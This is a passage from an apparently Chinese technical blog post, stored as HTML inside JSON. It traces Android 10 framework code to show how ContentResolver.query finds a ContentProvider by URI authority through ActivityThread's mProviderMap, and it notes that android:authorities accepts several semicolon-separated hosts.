class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> ProviderClientRecord <span class=\"title function_\">installProviderAuthoritiesLocked</span><span class=\"params\">(IContentProvider provider,</span></span><br><span class=\"line\"><span class=\"params\">        ContentProvider localProvider, ContentProviderHolder holder)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> String auths[] = holder.info.authority.split(<span class=\"string\">&quot;;&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">userId</span> <span class=\"operator\">=</span> UserHandle.getUserId(holder.info.applicationInfo.uid);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (provider != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">ProviderClientRecord</span> <span class=\"variable\">pcr</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ProviderClientRecord</span>(</span><br><span class=\"line\">            auths, provider, localProvider, holder);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (String auth : auths) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">ProviderKey</span> <span class=\"variable\">key</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ProviderKey</span>(auth, userId);</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">ProviderClientRecord</span> <span class=\"variable\">existing</span> <span class=\"operator\">=</span> mProviderMap.get(key);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (existing != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            mProviderMap.put(key, pcr); <span class=\"comment\">// 在此处添加的</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pcr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见，ProviderClientRecord实例的构造是在这个 <code>installProviderAuthoritiesLocked</code> 私有方法中完成并添加到map中的。<br>这里有个小插曲<strong>特别注意</strong>：方法的第一行代码，对 <strong>authority</strong> 字符串进行了分割（分隔符为;），最终ProviderClientRecord的数量也取决于分割出来的数组。所以在Manifest配置文件中声明 <code>android:authorities</code> 属性时，可以填入多个授权host（就好比多个域名可以同时指向一个网站），以分号分割，难怪属性名要用复数呢。</p>\n<p>接下来看看 <code>installProviderAuthoritiesLocked</code> 方法的调用处：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@UnsupportedAppUsage</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> ContentProviderHolder <span class=\"title function_\">installProvider</span><span class=\"params\">(Context context,</span></span><br><span class=\"line\"><span class=\"params\">        ContentProviderHolder holder, ProviderInfo info,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">boolean</span> noisy, <span class=\"type\">boolean</span> noReleaseNeeded, <span class=\"type\">boolean</span> stable)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">ContentProvider</span> <span class=\"variable\">localProvider</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    IContentProvider provider;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (holder == <span class=\"literal\">null</span> || holder.provider == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        provider = holder.provider;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ContentProviderHolder retHolder;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mProviderMap) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"type\">IBinder</span> <span class=\"variable\">jBinder</span> <span class=\"operator\">=</span> provider.asBinder();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (localProvider != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">ComponentName</span> <span class=\"variable\">cname</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(info.packageName, info.name);</span><br><span class=\"line\">            <span class=\"type\">ProviderClientRecord</span> <span class=\"variable\">pr</span> <span class=\"operator\">=</span> mLocalProvidersByName.get(cname);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (pr != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">                <span class=\"comment\">// 第一处调用</span></span><br><span class=\"line\">                pr = installProviderAuthoritiesLocked(provider, localProvider, holder);</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            retHolder = pr.mHolder;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">ProviderRefCount</span> <span class=\"variable\">prc</span> <span class=\"operator\">=</span> mProviderRefCountMap.get(jBinder);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (prc != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 第二处调用</span></span><br><span class=\"line\">                <span class=\"type\">ProviderClientRecord</span> <span class=\"variable\">client</span> <span class=\"operator\">=</span> installProviderAuthoritiesLocked(</span><br><span class=\"line\">                        provider, localProvider, holder);</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            retHolder = prc.holder;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retHolder;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由上， <code>installProviderAuthoritiesLocked</code> 方法的调用均在 <code>installProvider</code> 方法中。还记得上文的“插眼”吗？呼应上了。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ul>\n<li><p>在我们使用ContentResolver来进行查询操作时，<code>query</code> 方法层层调用到 <strong>ActivityThread</strong> 的 <code>acquireExistingProvider</code> 方法，根据URI字符串当中的授权host（即 <strong>authority</strong> ）和当前所在用户的 <strong>userId</strong> 来获取对应的Provider实例。</p>\n</li>\n<li><p>当 <code>acquireExistingProvider</code> 获取不到时，则通过 <code>installProvider</code> 方法来安装Provider并把其载体 <strong>ProviderClientRecord</strong> 添加到 <strong>mProviderMap</strong> 中。</p>\n</li>\n<li><p>AndroidManifest中声明Provider时， <code>android:authorities</code> 属性可以填多个字符串，以分号分割：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">provider</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.provider.TestProvider&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:authorities</span>=<span class=\"string\">&quot;com.xxx.yyy.provider;cn.xxx.yyy.provider;net.xxx.yyy.provider&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">...</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>如此可以写成多种不同host的URI，映射的却还是同一个ContentProvider。具体的好处我能想到的有几点：</p>\n<ul>\n<li>与同IP多域名的网站一样，域名多样化，提前抢占一些host，避免三方假冒。</li>\n<li>提供不同的URI分别给内部和外部开发者使用，便于区分和数据统计。</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"引子\"><a href=\"#引子\" class=\"headerlink\" title=\"引子\"></a>引子</h3><p>我们都知道四大组件之一ContentProvider的用处，它给大家提供一种统一的数据访问格式。调用者无需关心数据源于何处（如DB、XML文件和网络等），只需获取到对应的ContentResolver来进行增删查改即可。<br>自己实现一个Provider的时候，也会在配置文件中声明如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">provider</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.provider.TestProvider&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:authorities</span>=<span class=\"string\">&quot;com.xxx.yyy.provider&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:readPermission</span>=<span class=\"string\">&quot;com.xxx.yyy.permission.READ_PROVIDER&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>其中 <code>authorities</code> 是该Provider的唯一标识，所以一般都写成包名与其他字符串的组合形式，若需提供数据给其他应用，则 <code>exported</code> 要设为true，同时比较规范的做法还需要加上读写权限。<br>然后，我们再从常见的查询操作说起：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ContentResolver</span> <span class=\"variable\">r</span> <span class=\"operator\">=</span> getContentResolver();</span><br><span class=\"line\"><span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(<span class=\"string\">&quot;content://com.xxx.yyy.provider/test_path/1&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Cursor</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> r.query(uri, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure>\n\n<p>如同访问某个网站，我们访问ContentProvider也需要一个URI，其数据格式：</p>\n<ul>\n<li>scheme前缀是固定的： <strong>content:&#x2F;&#x2F;</strong></li>\n<li>授权host：此例中为 <strong>com.xxx.yyy.provider</strong></li>\n<li>路径与参数：此例中为 <strong>test_path&#x2F;1</strong></li>\n</ul>\n<p>那么，系统是如何通过这样一个URI来锁定对应的ContentProvider呢？</p>\n<h3 id=\"找寻\"><a href=\"#找寻\" class=\"headerlink\" title=\"找寻\"></a>找寻</h3><p>主要涉及源码（基于Android 10）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frameworks/base/core/java/android/content/ContentResolver.java</span><br><span class=\"line\">frameworks/base/core/java/android/app/ContextImpl.java</span><br><span class=\"line\">frameworks/base/core/java/android/app/ActivityThread.java</span><br></pre></td></tr></table></figure>\n\n<p>大致思路，便是追踪上述 <code>query</code> 方法中的参数uri，看看它的流向。根据源码设计的套路，起初几层调用都是看不到要害之处的，所以我们无需细读。来来来，先看ContentResolver的 <code>query</code> 方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"meta\">@Nullable</span> Cursor <span class=\"title function_\">query</span><span class=\"params\">(<span class=\"keyword\">final</span> <span class=\"meta\">@RequiresPermission</span>.Read <span class=\"meta\">@NonNull</span> Uri uri,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@Nullable</span> String[] projection, <span class=\"meta\">@Nullable</span> Bundle queryArgs,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@Nullable</span> CancellationSignal cancellationSignal)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"comment\">// 获取“不稳定”的Provider</span></span><br><span class=\"line\">    <span class=\"type\">IContentProvider</span> <span class=\"variable\">unstableProvider</span> <span class=\"operator\">=</span> acquireUnstableProvider(uri);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (unstableProvider == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">IContentProvider</span> <span class=\"variable\">stableProvider</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"type\">Cursor</span> <span class=\"variable\">qCursor</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 尝试查询操作</span></span><br><span class=\"line\">            qCursor = unstableProvider.query(mPackageName, uri, projection,</span><br><span class=\"line\">                    queryArgs, remoteCancellationSignal);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (DeadObjectException e) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// The remote process has died...  but we only hold an unstable</span></span><br><span class=\"line\">            <span class=\"comment\">// reference though, so we might recover!!!  Let&#x27;s try!!!!</span></span><br><span class=\"line\">            <span class=\"comment\">// This is exciting!!1!!1!!!!1</span></span><br><span class=\"line\">            <span class=\"comment\">// 这段注释我特意没删，感觉特别皮。大意：远程进程已死亡，但我们还持有unstableProvider的引用，快试试回收它的资源！这真是一颗赛艇！（虽然我不知道到底这哪儿exciting了）</span></span><br><span class=\"line\">            unstableProviderDied(unstableProvider);</span><br><span class=\"line\">            <span class=\"comment\">// “不稳定”的Provider操作失败，获取“稳定”的Provider</span></span><br><span class=\"line\">            stableProvider = acquireProvider(uri);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (stableProvider == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 再次尝试查询操作</span></span><br><span class=\"line\">            qCursor = stableProvider.query(</span><br><span class=\"line\">                    mPackageName, uri, projection, queryArgs, remoteCancellationSignal);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (qCursor == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (RemoteException e) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 释放资源</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从上述源码可得知，有两处代码在根据uri获取ContentProvider，即ContentResolver的 <code>acquireUnstableProvider</code> 和 <code>acquireProvider</code> 方法。先看看前者（后者最终殊途同归，本文不额外分析）：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> IContentProvider <span class=\"title function_\">acquireUnstableProvider</span><span class=\"params\">(Uri uri)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!SCHEME_CONTENT.equals(uri.getScheme())) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 这里硬核匹配字符串，凡是scheme不是content://的直接再见，所以它是固定的</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">auth</span> <span class=\"operator\">=</span> uri.getAuthority(); <span class=\"comment\">// 按例，此处获取到的字符串便包含&quot;com.xxx.yyy.provider&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (auth != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 此为ContentResolver中的抽象方法，由子Resolver各自具体实现</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> acquireUnstableProvider(mContext, uri.getAuthority());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>于是我们追踪到ContextImpl的静态内部类ApplicationContentResolver：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ApplicationContentResolver</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ContentResolver</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@UnsupportedAppUsage</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> ActivityThread mMainThread;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> IContentProvider <span class=\"title function_\">acquireUnstableProvider</span><span class=\"params\">(Context c, String auth)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mMainThread.acquireProvider(c,</span><br><span class=\"line\">                ContentProvider.getAuthorityWithoutUserId(auth),</span><br><span class=\"line\">                resolveUserIdFromAuthority(auth), <span class=\"literal\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>实际调用到ActivityThread当中去了，注意此时传递的关键参数已经是 <strong>auth</strong> 而不是uri了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@UnsupportedAppUsage</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> IContentProvider <span class=\"title function_\">acquireProvider</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">        Context c, String auth, <span class=\"type\">int</span> userId, <span class=\"type\">boolean</span> stable)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 获取已存在的Provider    </span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">IContentProvider</span> <span class=\"variable\">provider</span> <span class=\"operator\">=</span> acquireExistingProvider(c, auth, userId, stable);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (provider != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">return</span> provider;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"comment\">// 没获取到再尝试安装，这里来个插眼，等会有大用</span></span><br><span class=\"line\">    holder = installProvider(c, holder, holder.info,</span><br><span class=\"line\">            <span class=\"literal\">true</span> <span class=\"comment\">/*noisy*/</span>, holder.noReleaseNeeded, stable);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> holder.provider;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看源码一般来说最好先深后广，且优先搞清热点代码。接下来我们看 <code>acquireExistingProvider</code> 方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> IContentProvider <span class=\"title function_\">acquireExistingProvider</span><span class=\"params\">( Context c, String auth, <span class=\"type\">int</span> userId, <span class=\"type\">boolean</span> stable)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mProviderMap) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">ProviderKey</span> <span class=\"variable\">key</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ProviderKey</span>(auth, userId);</span><br><span class=\"line\">        <span class=\"comment\">// 关注这个存储Provider记录的的map，其实这里就是本文重点</span></span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">ProviderClientRecord</span> <span class=\"variable\">pr</span> <span class=\"operator\">=</span> mProviderMap.get(key);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pr == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">IContentProvider</span> <span class=\"variable\">provider</span> <span class=\"operator\">=</span> pr.mProvider; <span class=\"comment\">// 最终获取Provider实例</span></span><br><span class=\"line\">        <span class=\"type\">IBinder</span> <span class=\"variable\">jBinder</span> <span class=\"operator\">=</span> provider.asBinder();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!jBinder.isBinderAlive()) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Provider所在进程已死，直接返回null</span></span><br><span class=\"line\">            handleUnstableProviderDiedLocked(jBinder, <span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> provider;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>分析到这里，就自然而然有几个问题了， <strong>ProviderKey</strong> 是什么，怎么构造的？ <strong>mProviderMap</strong> 又是什么时候填充的？<br>带着问题，先看前者：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ProviderKey</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> String authority;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> userId;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ProviderKey</span><span class=\"params\">(String authority, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.authority = authority;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.userId = userId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">equals</span><span class=\"params\">(Object o)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">hashCode</span><span class=\"params\">()</span> &#123;</span><br><span 